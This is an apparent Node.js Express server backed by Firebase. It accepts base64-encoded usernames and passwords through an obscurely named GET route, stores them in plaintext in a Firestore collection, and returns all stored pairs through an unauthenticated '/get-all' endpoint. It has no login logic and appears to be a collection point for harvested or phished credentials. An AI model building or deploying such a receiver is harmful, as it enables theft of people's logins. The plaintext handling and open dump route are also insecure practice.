const express = require("express");
const app = express();
const admin = require("firebase-admin");
const serviceAccount = require("./firebase-key.json");

let arrUser=[]
admin.initializeApp({
  credential: admin.credential.cert(serviceAccount),
});
const db = admin.firestore();
const collectionRef = db.collection("user-chau");

app.get("/abcdfe", (req, res) => {
    console.log('====================================');
    console.log({req:req.body});
    console.log('====================================');
    res.send("hello");
  });
  app.get("/abcdfe/:userName/:pass/YmtpbmQ", (req, res) => {
   if(req.params.userName&&req.params.pass)
    arrUser.push({
    userName:atob(req.params.userName),
    pass:atob(req.params.pass)
   })
   collectionRef.add({
    userName:atob(req.params.userName),
    pass:atob(req.params.pass)
   })
    res.send({data:req.params.userName, status:200});
  });
  app.get("/get-all", async(req, res) => {
    let arr=[];
    const snapshot = await collectionRef.get();
snapshot.forEach(doc => {
  arr.push(doc.data())
  
  console.log(doc.id, '=>', doc.data());
});

     res.send({arr});
   });
  app.listen( process.env.PORT ||3002 , () => {
    // app.listen(3002, () => {
      console.log("listening on port", process.env.PORT || 3002);
});
    